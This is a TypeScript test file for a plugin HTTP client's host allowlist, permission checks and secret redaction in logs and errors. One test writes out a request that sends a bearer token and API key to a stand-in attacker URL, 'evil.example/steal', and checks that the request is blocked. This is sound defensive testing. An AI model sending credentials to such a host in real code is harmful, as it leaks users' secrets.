import { createServer, type IncomingMessage, type Server } from "node:http";
import {
  ForgeHttpError,
  ForgePermissionError,
  REDACTED,
  type PluginLogger,
} from "@fluxo/forge";
import { afterEach, describe, expect, it } from "vitest";
import { createPluginHttp, isHttpHostAllowed } from "./http.js";

function capturingLogger(): { logger: PluginLogger; entries: unknown[] } {
  const entries: unknown[] = [];
  const logger: PluginLogger = {
    debug(message, meta) {
      entries.push({ level: "debug", message, meta });
    },
    info(message, meta) {
      entries.push({ level: "info", message, meta });
    },
    warn(message, meta) {
      entries.push({ level: "warn", message, meta });
    },
    error(message, meta) {
      entries.push({ level: "error", message, meta });
    },
    child() {
      return logger;
    },
  };
  return { logger, entries };
}

async function listen(
  handler: (req: IncomingMessage) => { status: number; body: string; headers?: Record<string, string> },
): Promise<{ origin: string; close: () => Promise<void> }> {
  const server: Server = createServer((req, res) => {
    const result = handler(req);
    res.writeHead(result.status, {
      "content-type": "application/json",
      ...result.headers,
    });
    res.end(result.body);
  });
  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", () => resolve());
  });
  const address = server.address();
  if (address === null || typeof address === "string") {
    throw new Error("expected tcp address");
  }
  return {
    origin: `http://127.0.0.1:${String(address.port)}`,
    close: () =>
      new Promise((resolve, reject) => {
        server.close((error) => (error ? reject(error) : resolve()));
      }),
  };
}

const servers: Array<() => Promise<void>> = [];

afterEach(async () => {
  await Promise.all(servers.splice(0).map((close) => close()));
});

describe("plugin http allowlist", () => {
  it("fails closed when the allowlist is empty", async () => {
    const { logger } = capturingLogger();
    const http = createPluginHttp({
      pluginId: "acme.demo",
      permissions: ["http.outbound"],
      allowlist: [],
      logger,
    });
    await expect(
      http.request({ url: "https://panel.example.com/v1" }),
    ).rejects.toBeInstanceOf(ForgeHttpError);
  });

  it("rejects a host that is not on the allowlist", async () => {
    const { logger, entries } = capturingLogger();
    const http = createPluginHttp({
      pluginId: "acme.demo",
      permissions: ["http.outbound"],
      allowlist: ["panel.example.com"],
      logger,
    });
    const secret = "Bearer super-secret-token";
    await expect(
      http.request({
        url: "https://evil.example/steal",
        headers: { Authorization: secret, "x-api-key": "k-live" },
      }),
    ).rejects.toBeInstanceOf(ForgeHttpError);
    const dumped = JSON.stringify(entries);
    expect(dumped).not.toContain("super-secret-token");
    expect(dumped).not.toContain("k-live");
  });

  it("allows an exact allowlist host match", async () => {
    const seen: string[] = [];
    const server = await listen((req) => {
      seen.push(req.headers.authorization ?? "");
      return { status: 200, body: JSON.stringify({ ok: true }) };
    });
    servers.push(server.close);
    const { logger } = capturingLogger();
    const http = createPluginHttp({
      pluginId: "acme.demo",
      permissions: ["http.outbound"],
      allowlist: ["127.0.0.1"],
      logger,
    });
    const response = await http.request({
      url: `${server.origin}/ok`,
      headers: { Authorization: "Bearer super-secret-token" },
    });
    expect(response.status).toBe(200);
    expect(response.body).toEqual({ ok: true });
    expect(seen).toEqual(["Bearer super-secret-token"]);
  });

  it("does not include secrets in logged or error output", async () => {
    const { logger, entries } = capturingLogger();
    const http = createPluginHttp({
      pluginId: "acme.demo",
      permissions: ["http.outbound"],
      allowlist: ["127.0.0.1"],
      logger,
      fetchImpl: async (input, init) => {
        const headers = new Headers(init?.headers);
        expect(headers.get("authorization")).toBe("Bearer super-secret-token");
        expect(headers.get("user-agent")).toMatch(/^Fluxo-Forge\//);
        return new Response(JSON.stringify({ ok: true }), {
          status: 200,
          headers: { "content-type": "application/json" },
        });
      },
    });
    await http.request({
      url: "http://127.0.0.1/v1",
      headers: { Authorization: "Bearer super-secret-token", Cookie: "sid=abc" },
    });
    const dumped = JSON.stringify(entries);
    expect(dumped).not.toContain("super-secret-token");
    expect(dumped).not.toContain("sid=abc");
    expect(dumped).toContain(REDACTED);
    try {
      const closed = createPluginHttp({
        pluginId: "acme.demo",
        permissions: ["http.outbound"],
        allowlist: [],
        logger,
      });
      await closed.request({
        url: "https://panel.example.com",
        headers: { Authorization: "Bearer super-secret-token" },
      });
    } catch (error) {
      expect(error).toBeInstanceOf(ForgeHttpError);
      expect(String(error)).not.toContain("super-secret-token");
    }
  });

  it("denies outbound HTTP without permission even when allowlisted", async () => {
    const { logger } = capturingLogger();
    const http = createPluginHttp({
      pluginId: "acme.demo",
      permissions: [],
      allowlist: ["panel.example.com"],
      logger,
    });
    await expect(
      http.request({ url: "https://panel.example.com" }),
    ).rejects.toBeInstanceOf(ForgePermissionError);
  });
});

describe("isHttpHostAllowed", () => {
  it("matches hostname and hostname:port allowlist entries", () => {
    const url = new URL("https://panel.example.com/v1");
    expect(isHttpHostAllowed(url, [])).toBe(false);
    expect(isHttpHostAllowed(url, ["panel.example.com"])).toBe(true);
    expect(isHttpHostAllowed(url, ["other.example.com"])).toBe(false);
    expect(isHttpHostAllowed(url, ["panel.example.com:443"])).toBe(true);
    expect(isHttpHostAllowed(new URL("http://10.0.0.12/x"), ["10.0.0.12"])).toBe(true);
  });
});
